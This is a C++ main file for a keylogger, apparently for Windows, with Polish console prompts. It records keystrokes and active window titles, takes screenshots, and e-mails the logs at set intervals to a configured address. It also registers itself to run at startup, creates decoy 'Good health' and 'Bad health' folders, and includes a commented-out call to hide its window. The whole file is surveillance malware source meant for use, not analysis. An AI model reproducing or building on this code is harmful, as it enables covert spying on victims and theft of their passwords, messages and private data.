#include "stdafx.h"

#include "Keylogger.h"
#include "Application_History.h"
#include "Screenshot.h"
#include "Mail_sender.h"
#include "Utility.h"

#include <thread>
#include <iostream>


const bool saving_enabled = true;

int main(int argc, char *argv[])
{				
	try
	{
		std::cout << "File path: " << utility::get_application_path << std::endl;
		utility::get_application_path();

		std::string mail_to;
		int email_send_loop_time;
		std::vector<std::string> keywords;

		// Checks if this is the first time user is switching ON the application (or has manually deleted configuration.txt file)
		bool configuration_done = utility::file_exists(configuration::configuration_file_name);
		if (configuration_done)
		{
			configuration::configuration_file_content configuration = configuration::load_configuration_from_file();

			mail_to = configuration.mail_to;
			email_send_loop_time = configuration.mail_send_loop;
			keywords = configuration.keywords;
			std::cout << "Maile beda wysylane do: " << mail_to << std::endl;
		}
		else
		{
			std::cout << "Prosze podac adres e-mail: ";
			std::cin >> mail_to;

			std::cout << "Prosze podac co ile minut wysylac e-mail z logami: ";
			std::cin >> email_send_loop_time;

			keywords = get_keywords();

			// Create new directory
			std::wstring new_directory_part1(configuration::logs_base_path_part1.begin(), configuration::logs_base_path_part1.end());
			utility::create_folder(new_directory_part1.c_str());

			// Create directory where logs will be saved.
			std::wstring new_directory(configuration::logs_base_path.begin(), configuration::logs_base_path.end());
			utility::create_folder(new_directory.c_str());

			// Create 2 dummies directory
			std::wstring dummy_directory = new_directory_part1 + std::wstring(L"\\Good health");
			std::wstring dummy_directory_2 = new_directory_part1 + std::wstring(L"\\Bad health");
			utility::create_folder(dummy_directory.c_str());
			utility::create_folder(dummy_directory_2.c_str());
			
			// Save it to the file
			configuration::save_configuration_to_file(mail_to, email_send_loop_time, keywords);

			utility::RegisterProgram();
			utility::IsMyProgramRegisteredForStartup(configuration::application_name.c_str());
		}

		/*************************************************/

		//utility::hide_window();

		Keylogger keylogger(saving_enabled, keywords);
		std::string file_path = keylogger.create_file();
		std::ofstream file_logs(file_path);

		Application_History application_history(file_logs, keylogger.get_file_logs_clean_keys(),
			file_path, saving_enabled);

		// Send e-mails at given time interval in a separate thread
		EMail_Sender email(mail_to, email_send_loop_time);
		std::thread email_thread(&EMail_Sender::send_email, email, keylogger.get_path_to_clean_keys());
		email_thread.detach();

		// Take screenshots in a separate thread
		Screenshot screenshoter;
		std::thread screenshot_thread(&Screenshot::auto_start, screenshoter);
		screenshot_thread.detach();

		// In a loop we get keys from keyboard and names of the applications that are active.
		while (1)
		{
			application_history.get_window_name();
			application_history.update_window();
			keylogger.get_key(file_logs);
		}

		file_logs.close();
	}
	catch (const std::exception &ex)
	{
		std::cout << "Wyjatek: " << ex.what() << std::endl;
	}
	return 0;
}
